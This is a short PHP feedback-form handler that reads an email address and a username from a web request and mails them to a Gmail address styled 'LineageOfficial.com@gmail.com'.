<?php

$webmaster_email = "LineageOfficial.com@gmail.com";

/*
This next bit loads the form field data into variables.
If you add a form field, you will need to add it here.
*/

$Error = $_REQUEST['Error.html'] ;
$email_address = $_REQUEST['E-Mail'] ;
$Username = $_REQUEST['Username'] ;

$msg =
"Email: " . $email_address . "\r\n" .
"Username: " . $Username ;

mail( "$webmaster_email", "Feedback Form Results", $msg );

?>
